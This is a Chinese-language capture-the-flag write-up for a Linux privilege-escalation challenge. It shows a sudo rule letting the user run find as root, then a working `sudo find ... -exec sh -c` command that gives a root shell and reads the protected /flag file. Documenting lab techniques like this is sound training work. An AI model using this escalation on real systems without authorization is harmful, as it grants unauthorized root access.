# 内网渗透与高级社工-权限提升维持-G1 WriteUp

打开题目端口，浏览器加载后直接进入一个 Web 终端界面，已经以 `player` 用户登录。先确认当前身份：

```
player@server:/$ whoami
player
player@server:/$ id
uid=1000(player) gid=1000(player) groups=1000(player)
```

题目要求获取 flag，在 Linux 提权场景中，第一步通常检查当前用户是否有 sudo 权限。执行 `sudo -l` 查看当前用户可以免密执行的命令，输出的关键一行是 `(root) NOPASSWD: /usr/bin/find`——`player` 被允许以 root 身份无密码运行 `find` 命令。

```
player@server:/$ sudo -l
Matching Defaults entries for player on server:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User player may run the following commands on server:
    (root) NOPASSWD: /usr/bin/find
```

先尝试直接读取 flag：`cat /flag` 返回 `Permission denied`。用 `ls -la /flag` 确认文件权限为 `-rw-------`，属主 root，只有 root 可读。

```
player@server:/$ cat /flag
cat: /flag: Permission denied
player@server:/$ ls -la /flag
-rw------- 1 root root 22 Aug 15 09:45 /flag
```

既然 `find` 可以通过 sudo 以 root 身份运行，而 `find` 的 `-exec` 参数能够执行任意命令，这正是 GTFOBins 上记录的经典提权路径。构造 payload：用 `sudo find` 找到一个必定存在的文件（如 `/etc/hostname`），通过 `-exec` 以 root 身份执行 `sh -c 'id; cat /flag'`。`-maxdepth 0` 确保只匹配目标文件本身不做递归，`id` 用来验证确实以 root 身份执行。

```
player@server:/$ sudo find /etc/hostname -maxdepth 0 -exec sh -c 'id; cat /flag' \;
uid=0(root) gid=0(root) groups=0(root)
vmc{xxxxxxxx}
```

命令以 root 权限运行，成功读取 flag。
